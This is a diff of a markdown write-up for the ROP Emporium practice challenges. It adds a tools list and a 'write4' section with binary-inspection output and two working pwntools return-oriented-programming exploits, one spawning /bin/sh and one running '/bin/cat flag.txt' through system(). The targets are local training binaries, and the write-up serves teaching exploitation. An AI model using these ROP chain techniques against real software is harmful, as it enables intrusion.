@@ -1,5 +1,12 @@
 # Rop Emporium
 
+## Tools
+Rabin2
+Ra2 - izz
+Gdb - info functions
+objdump
+ROPGadget
+
 ## 0) Ret2win
 
 ### GDB function
@@ -89,7 +96,9 @@ You there madam, may I have your input please? And don't worry about null bytes,
 
 > Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
 ```
+
 ## 1) Split
+
 ### Rabin2
 ```
 [root:~/Downloads/RopEmporium]# rabin2 -I split
@@ -243,7 +252,9 @@ split by ROP Emporium
 Contriving a reason to ask user for data...
 > ROPE{a_placeholder_32byte_flag!}
 ```
+
 ## 2) CallMe
+
 ### Rabin2
 ```
 [root:~/Downloads/RopEmporium]# rabin2 -I callme    
@@ -373,5 +384,212 @@ callme by ROP Emporium
 64bits
 
 Hope you read the instructions...
+> ROPE{a_placeholder_32byte_flag!}
+```
+
+## 3) Write4
+
+### GDB functions
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x00000000004005a0  _init
+0x00000000004005d0  puts@plt
+0x00000000004005e0  system@plt
+0x00000000004005f0  printf@plt
+0x0000000000400600  memset@plt
+0x0000000000400610  __libc_start_main@plt
+0x0000000000400620  fgets@plt
+0x0000000000400630  setvbuf@plt
+0x0000000000400640  __gmon_start__@plt
+0x0000000000400650  _start
+0x0000000000400680  deregister_tm_clones
+0x00000000004006c0  register_tm_clones
+0x0000000000400700  __do_global_dtors_aux
+0x0000000000400720  frame_dummy
+0x0000000000400746  main
+0x00000000004007b5  pwnme
+0x0000000000400807  usefulFunction
+0x0000000000400820  usefulGadgets
+0x0000000000400830  __libc_csu_init
+0x00000000004008a0  __libc_csu_fini
+0x00000000004008a4  _fini
+pwndbg> 
+
+```
+### NM
+```
+[root:~/Downloads/RopEmporium]# nm ./write4 | grep ' t '
+0000000000400680 t deregister_tm_clones
+0000000000400700 t __do_global_dtors_aux
+0000000000400720 t frame_dummy
+00000000004007b5 t pwnme
+00000000004006c0 t register_tm_clones
+0000000000400807 t usefulFunction
+```
+### Rabin2
+```
+[root:~/Downloads/RopEmporium]# rabin2 -I write4
+arch     x86
+baddr    0x400000
+binsz    7150
+bintype  elf
+bits     64
+canary   false
+sanitiz  false
+class    ELF64
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    partial
+rpath    NONE
+static   false
+stripped false
+subsys   linux
+va       true
+```
+### Exploit (launch /bin/sh)
+```
+# Import the library
+from pwn import *
+
+# Debugging
+context.log_level = 'debug'
+context.arch = 'amd64'
+
+# Binary has NX set - no typical BOF - 
+# Help info: http://docs.pwntools.com/en/stable/intro.html
+
+elf = ELF("write4")
+
+# Variables
+system = p64(elf.symbols["system"])
+# Gagdet: 0x0000000000400820 : mov qword ptr [r14], r15 ; ret
+movGadget = p64(0x400820)
+# Gadget: 0x0000000000400890 : pop r14 ; pop r15 ; ret
+popGadget = p64(0x400890)
+# Section to write data, readelf -a ./write4;readelf -x .data ./write4
+writeWhatWhere = p64(0x601050)
+# String to execute with the system function
+stringToWrite = "/bin/sh\x00"
+# Gadget: 0x0000000000400893 : pop rdi ; ret
+poprdi = p64(0x0000000000400893)
+
+# Pack the arguments for the functions we want to call
+payload = "a" * 40
+payload += popGadget
+payload += writeWhatWhere
+payload += stringToWrite
+payload += movGadget
+payload += poprdi
+payload += p64(0x601050)
+
+payload += system
+
+
+io = elf.process()
+#gdb.attach(io)
+io.sendline(payload)
+#data = io.recvall()
+#print(data)
+#
+io.interactive()
+```
+### Exploit (/bin/cat flag.txt)
+```
+# Import the library
+from pwn import *
+
+# Debugging
+# context.log_level = 'debug'
+context.arch = 'amd64'
+
+# Binary has NX set - no typical BOF - 
+# Help info: http://docs.pwntools.com/en/stable/intro.html
+
+elf = ELF("write4")
+
+# Variables
+system = p64(elf.symbols["system"])
+# Gagdet: 0x0000000000400820 : mov qword ptr [r14], r15 ; ret
+movGadget = p64(0x0000000000400820)
+# Gadget: 0x0000000000400890 : pop r14 ; pop r15 ; ret
+popGadget = p64(0x0000000000400890)
+# Section to write data, readelf -a ./write4;readelf -x .data ./write4
+writeWhatWhere = p64(0x0000000000601050)
+# Gadget: 0x0000000000400893 : pop rdi ; ret
+poprdi = p64(0x0000000000400893)
+
+# Pack the arguments for the functions we want to call
+payload = "a" * 40
+
+# Write the first 8 bytes
+payload += popGadget
+payload += p64(0x601050)
+payload += "/bin/cat"
+
+# Move the first 8 bytes to the address 0x601050
+payload += movGadget
+
+# Write the second 8 bytes
+payload += popGadget
+payload += p64(0x601058)
+payload += " flag.tx"
+
+# Move the second 8 bytes to the address 0x601058
+payload += movGadget
+
+# Write the second 8 bytes
+payload += popGadget
+payload += p64(0x601060)
+payload += "t\x00\x00\x00\x00\x00\x00\x00"
+
+# Move the third 8 bytes to the address 0x601060
+payload += movGadget
+
+# Pop the address where the string is into RDI
+payload += poprdi
+payload += p64(0x601050)
+
+# Fire system()
+payload += system
+
+io = elf.process()
+# gdb.attach(io)
+io.sendline(payload)
+data = io.recvall()
+print(data)
+```
+### Result
+```
+[root:~/Downloads/RopEmporium]# python exploit-write4-x64.py
+[*] '/root/Downloads/RopEmporium/write4'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Starting local process '/root/Downloads/RopEmporium/write4': pid 46943
+[+] Receiving all data: Done (107B)
+[*] Process '/root/Downloads/RopEmporium/write4' stopped with exit code -11 (SIGSEGV) (pid 46943)
+write4 by ROP Emporium
+64bits
+
+Go ahead and give me the string already!
 > ROPE{a_placeholder_32byte_flag!}
 ```
